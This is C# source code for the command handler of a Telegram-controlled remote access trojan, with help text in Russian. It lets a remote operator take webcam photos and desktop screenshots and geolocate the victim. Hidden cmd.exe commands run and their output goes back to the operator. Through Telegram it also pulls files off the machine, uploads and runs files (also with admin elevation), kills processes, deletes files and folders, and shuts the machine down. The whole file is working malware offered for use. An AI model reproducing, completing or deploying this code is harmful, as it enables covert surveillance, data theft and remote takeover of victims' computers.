using System;
using System.IO;
using System.Net;
using System.Drawing;
using System.Threading;
using System.Diagnostics;
using System.Speech.Synthesis;
using System.Windows.Forms;
using SimpleJSON;


namespace TelegramRAT
{
    internal sealed class commands
    {
        public static void handle(string command)
        {
            Console.WriteLine("[~] Handling command " + command);
            string[] args = command.Split(' ');
            args[0] = args[0].Remove(0, 1).ToUpper();
            switch (args[0])
            {
                case "START":
                case "HELP":
                    {
                        telegram.sendText(
                            "\n ❓❓ /Help - помощь ❓❓" +
                            "\n"+
                            "\n 📊📊 Информация о ПК 📊📊" +
                            "\n /ComputerInfo - информация о ПК" +
                            "\n /BatteryInfo - информация о батарее"+
                            "\n /Whois - информация о местоположении"+
                            "\n /ActiveWindow - активное окно" +
                            "\n" +
                            "\n 📷📷 Изображения 📷📷 " +
                            "\n /Webcam <n> <delay> - фото с камеры n с задержкой delay" +
                            "\n /Desktop - скриншот рабочего стола" +
                            "\n" +
                            "\n 🔄🔄 Процессы 🔄🔄" +
                            "\n /ProcessList - список процессов" +
                            "\n /ProcessKill <process> - убить процесс" +
                            "\n /ProcessStart <process> - запустить процесс" +
                            "\n" +
                            "\n 🟥🟥 Выключение 🟥🟥" +
                            "\n /Shutdown - выключить ПК" +
                            "\n /Reboot - перезапустить ПК" +
                            "\n /Hibernate - гибернитация ПК" +
                            "\n /Logoff - деаунтификация пользователя" +
                            "\n" +
                            "\n 💬💬 Комуникация 💬💬" +
                            "\n /Speak <text> - сказать текст" +
                            "\n /Shell <command>" +
                            "\n /MessageBox <error/info/warn> <text>" +
                            "\n /OpenURL <url>" +
                            "\n" +
                            "\n 📁📁 Файл 📁📁" +
                            "\n /DownloadFile <file/dir>" +
                            "\n /UploadFile <drop/url>" +
                            "\n /RunFile <file>" +
                            "\n /RunFileAdmin <file>" +
                            "\n /ListFiles <dir>" +
                            "\n /RemoveFile <file>" +
                            "\n /RemoveDir <dir>" +
                            "");
                        break;
                    }
                case "COMPUTERINFO":
                    {
                        telegram.sendText(
                            "\n💻 Информация о ПК:" +
                            "\nSystem: " + utils.GetSystemVersion() +
                            "\nComputer name: " + Environment.MachineName +
                            "\nUser name: " + Environment.UserName +
                            "\nSystem time: " + DateTime.Now.ToString("yyyy-MM-dd h:mm:ss tt") +
                            "\n" +
                            "\n🔭 Программы:" +
                            "\n" + utils.GetProgramsList() +
                            "\n" +
                            "\n📇 Аппаратное обеспечение:" +
                            "\nCPU: " + utils.GetCPUName() +
                            "\nGPU: " + utils.GetGPUName() +
                            "\nRAM: " + utils.GetRamAmount() + "MB" +
                            "\nHWID: " + utils.GetHWID() +
                        "");
                        break;
                    }
                case "BATTERYINFO":
                    {
                       
                        
                        telegram.sendText(
                            "\n🔋 Информация о батарее:" +
                            "\nСтатус батареи: " + utils.batteryStatus() +
                            "\nПроцент заряда: " + utils.batteryPercent() +
                            "\n"
                        );
                        break;
                    }
                case "WHOIS":
                    {
                        string url = @"http://ip-api.com/json/";
                        WebClient client = new WebClient();
                        string response = client.DownloadString(url);
                        dynamic json = JSON.Parse(response);
                        telegram.sendText(
                            "\n📡 Whois:" +
                            "\nIP: " + json["query"] +
                            "\nCountry: " + json["country"] + "[" + json["countryCode"] + "]" +
                            "\nCity: " + json["city"] +
                            "\nRegion: " + json["regionName"] +
                            "\nInternet provider: " + json["isp"] +
                            "\nLatitude: " + json["lat"] +
                            "\nLongitude: " + json["lon"] +
                            "");
                        break;
                    }
                case "ACTIVEWINDOW":
                    {
                        telegram.sendText("💬 Active window: " + utils.GetActiveWindowTitle());
                        break;
                    }
                case "WEBCAM":
                    {
                        string delay, camera;
                        try
                        {
                            camera = args[1];
                            delay = args[2];
                        }
                        catch (IndexOutOfRangeException)
                        {
                            delay = "500";
                            camera = "1";
                        }
                        utils.webcamScreenshot(delay, camera);
                        break;
                    }
                case "DESKTOP":
                    {
                        utils.desktopScreenshot();
                        break;
                    }
              
                case "PROCESSLIST":
                    {
                        string list = "📊 Процесс лист:\n";
                        foreach (Process process in Process.GetProcesses())
                        {
                            list += "\n " + process.ProcessName + ".exe";
                        }
                        telegram.sendText(list);
                        break;
                    }
                case "PROCESSKILL":
                    {
                        string processName;
                        try
                        {
                            processName = args[1];
                        }
                        catch (IndexOutOfRangeException)
                        {
                            telegram.sendText("❌ Укажите аргумент <process>!");
                            break;
                        }
                        if (processName.EndsWith(".exe"))
                        {
                            processName = processName.Substring(0, processName.Length - 4);
                        }
                        foreach (var process in Process.GetProcessesByName(processName))
                        {
                            process.Kill();
                        }
                        telegram.sendText($"✅ Процесс с именем {processName} остановлен");
                        break;
                    }
                case "PROCESSSTART":
                    {
                        string processName;
                        try
                        {
                            processName = args[1];
                        }
                        catch (IndexOutOfRangeException)
                        {
                            telegram.sendText("❌ Укажите аргумент <process>!");
                            break;
                        }
                        if (processName.EndsWith(".exe"))
                        {
                            processName = processName.Substring(0, processName.Length - 4);
                        }
                        try
                        {
                            Process.Start(processName);
                        }
                        catch (System.ComponentModel.Win32Exception)
                        {
                            telegram.sendText("❌ Процесс не запущен!");
                            break;
                        }
                        telegram.sendText($"✅ Процесс с именем {processName} запущен");
                        break;
                    }
                case "SHUTDOWN":
                    {
                        telegram.sendText("💡 Выключение...");
                        Thread.Sleep(1200);
                        utils.PowerCommand("/s /t 0");
                        break;
                    }
                case "REBOOT":
                    {
                        telegram.sendText("💡 Перезагрузка...");
                        Thread.Sleep(1200);
                        utils.PowerCommand("/r /t 0");
                        break;
                    }
                case "HIBERNATE":
                    {
                        telegram.sendText("💡 Гибернитация...");
                        Thread.Sleep(1200);
                        utils.PowerCommand("/h");
                        break;
                    }
                case "LOGOFF":
                    {
                        telegram.sendText("💡 Выход пользователя...");
                        Thread.Sleep(1200);
                        utils.PowerCommand("/l");
                        break;
                    }
                case "SPEAK":
                    {
                        string text;
                        try
                        {
                            text = args[1];
                        }
                        catch (IndexOutOfRangeException)
                        {
                            telegram.sendText("❌ Укажите аргумент <text>!");
                            break;
                        }
                        text = string.Join(" ", args, 1, args.Length - 1);
                        telegram.sendText($"📢 Говорю текст: {text}");
                        SpeechSynthesizer synthesizer = new SpeechSynthesizer();
                        synthesizer.Volume = 100;  // 0...100 Громкость
                        synthesizer.Rate = -2;     // -10...10 Скорость
                        synthesizer.Speak(text);
                        break;
                    }
                case "SHELL":
                    {
                        string cmd_command;
                        try
                        {
                            cmd_command = args[1];
                        }
                        catch (IndexOutOfRangeException)
                        {
                            telegram.sendText("❌ Укажите аргумент <command>!");
                            break;
                        }
                        cmd_command = "/c " + string.Join(" ", args, 1, args.Length - 1);
                        Process p = new Process();
                        p.StartInfo.UseShellExecute = false;
                        p.StartInfo.RedirectStandardOutput = true;
                        p.StartInfo.RedirectStandardError = true;
                        p.StartInfo.FileName = "cmd.exe";
                        p.StartInfo.Arguments = cmd_command;
                        p.StartInfo.CreateNoWindow = true;
                        p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                        p.Start();
                        string stdout = p.StandardOutput.ReadToEnd();
                        string stderr = p.StandardError.ReadToEnd();
                        int code = p.ExitCode;
                        p.WaitForExit();
                        telegram.sendText(
                           "💻 Command output:" +
                            "\n[STDOUT]:" +
                            $"\n{stdout}" +
                            "\n[STDERR]:" +
                            $"\n{stderr}" +
                            $"\n[CODE]: {code}"
                        );
                        break;
                    }
                case "MESSAGEBOX":
                    {
                        string text;
                        string type;
                        try
                        {
                            type = args[1];
                            text = args[2];
                        }
                        catch (IndexOutOfRangeException)
                        {
                            telegram.sendText("❌ Укажите аргумент <type>, <text>!");
                            break;
                        }
                        args[1] = "";
                        text = string.Join(" ", args, 1, args.Length - 1);
                        MessageBoxIcon icon;
                        if (type == "error")
                            icon = MessageBoxIcon.Error;
                        else if (type == "warn")
                            icon = MessageBoxIcon.Warning;
                        else if (type == "exclamination")
                            icon = MessageBoxIcon.Exclamation;
                        else if (type == "question")
                            icon = MessageBoxIcon.Question;
                        else
                            icon = MessageBoxIcon.Information;
                        telegram.sendText($"📢 Открыт messagebox с текстом {text} и типом {type}");
                        MessageBox.Show(new Form() { TopMost = true }, text, type.ToUpper(), MessageBoxButtons.YesNoCancel, icon);

                        break;
                    }
                case "OPENURL":
                    {
                        string url;
                        try
                        {
                            url = args[1];
                        }
                        catch (IndexOutOfRangeException)
                        {
                            telegram.sendText("❌ Укажите аргумент <url>!");
                            break;
                        }
                        if (!url.StartsWith("http"))
                        {
                            url = "http://" + url;
                        }
                        var ps = new ProcessStartInfo(url)
                        {
                            UseShellExecute = true,
                            Verb = "open"
                        };
                        try
                        {
                            Process.Start(ps);
                        }
                        catch
                        {
                            telegram.sendText("❌ Ошибка открытия URL");
                            break;
                        }
                        telegram.sendText("📚 URL открыт");
                        break;
                        
                    }
                case "DOWNLOADFILE":
                    {
                        string path;
                        try
                        {
                            path = args[1];
                        }
                        catch (IndexOutOfRangeException)
                        {
                            telegram.sendText("❌ Укажите аргумент <file/dir>!");
                            break;
                        }
                        telegram.UploadFile(path);
                        break;
                    }
                case "UPLOADFILE":
                    {
                        string path;
                        try
                        {
                            path = args[1];
                        }
                        catch (IndexOutOfRangeException)
                        {
                            telegram.sendText("❌ Укажите аргумент  <url>!");
                            break;
                        }
                        telegram.DownloadFile(path);
                        break;
                    }

                case "LISTFILES":
                    {
                        string path;
                        try
                        {
                            path = args[1];
                        }
                        catch (IndexOutOfRangeException)
                        {
                            path = ".";
                        }

                        if (!Directory.Exists(path))
                        {
                            telegram.sendText(string.Format("❌ Директория \"{0}\" не найдена!", Path.GetDirectoryName(path + "\\")));
                            break;
                        }

                        string[] files = Directory.GetFiles(path);
                        string[] dirs = Directory.GetDirectories(path);
                        string formatted = "📦 Dirs/Files list:\n\n" + string.Join("\\\n", dirs) + "\\\n" + string.Join("\n", files);
                        telegram.sendText(formatted);
                        break;
                    }
                case "REMOVEFILE":
                    {
                        string path;
                        try
                        {
                            path = args[1];
                        }
                        catch (IndexOutOfRangeException)
                        {
                            telegram.sendText("❌ Укажите аргумент <file>!");
                            break;
                        }
                        if (!File.Exists(path))
                        {
                            telegram.sendText(string.Format("❌ Файл \"{0}\" не найден!", Path.GetFileName(path)));
                            break;
                        }
                        try
                        {
                            File.Delete(args[1]);
                        }
                        catch
                        {
                            telegram.sendText(string.Format("❌ Файл \"{0}\" не удален!", Path.GetFileName(args[1])));
                            break;
                        }
                        telegram.sendText(string.Format("✅ Файл \"{0}\" удален!", Path.GetFileName(args[1])));
                        break;
                    }
                case "REMOVEDIR":
                    {
                        string path;
                        try
                        {
                            path = args[1];
                        }
                        catch (IndexOutOfRangeException)
                        {
                            telegram.sendText("❌ Укажите аргумент <dir>!");
                            break;
                        }
                        if (!Directory.Exists(path))
                        {
                            telegram.sendText(string.Format("❌ Директория \"{0}\" не найдена!", Path.GetDirectoryName(path + "\\")));
                            break;
                        }
                        try
                        {
                            Directory.Delete(path, true);
                        }
                        catch
                        {
                            telegram.sendText(string.Format("❌ Директория \"{0}\" не удалена!", Path.GetDirectoryName(path + "\\")));
                            break;
                        }
                        telegram.sendText(string.Format("✅ Директория \"{0}\" удалена!", Path.GetDirectoryName(path + "\\")));
                        break;
                    }
                case "RUNFILE":
                    {
                        string path;
                        try
                        {
                            path = args[1];
                        }
                        catch (IndexOutOfRangeException)
                        {
                            telegram.sendText("❌ Укажите аргумент <file>!");
                            break;
                        }
                        if (!File.Exists(path))
                        {
                            telegram.sendText(string.Format("❌ Файл \"{0}\" не найден!", Path.GetFileName(path)));
                            break;
                        }
                        try
                        {
                            Process.Start(path);
                        }
                        catch
                        {
                            telegram.sendText(string.Format("❌ Ошибка запуска!"));
                            break;
                        }
                        telegram.sendText(string.Format("✅ Запуск файла \"{0}\"", Path.GetDirectoryName(path + "\\")));
                        break;
                    }
                case "RUNFILEADMIN":
                    {
                        string path;
                        try
                        {
                            path = args[1];
                        }
                        catch (IndexOutOfRangeException)
                        {
                            telegram.sendText("❌ Укажите аргумент <file>!");
                            break;
                        }
                        if (!File.Exists(path))
                        {
                            telegram.sendText(string.Format("❌ Файл \"{0}\" не найден!", Path.GetFileName(path)));
                            break;
                        }
                        Process proc = new Process();
                        proc.StartInfo.FileName = path;
                        proc.StartInfo.UseShellExecute = true;
                        proc.StartInfo.Verb = "runas";
                        try
                        {
                            proc.Start();
                        }
                        catch (System.ComponentModel.Win32Exception)
                        {
                            telegram.sendText(string.Format("❌ Операция отменена"));
                            break;
                        }
                        telegram.sendText(string.Format("✅ Запуск файла \"{0}\"", Path.GetDirectoryName(path + "\\")));
                        break;
                    }
                
                default:
                    {
                        telegram.sendText(
                            "📡 Неизвестная команда"+
                            "\nUse /help for help ");
                        break;
                    }
            }
        }
    }
}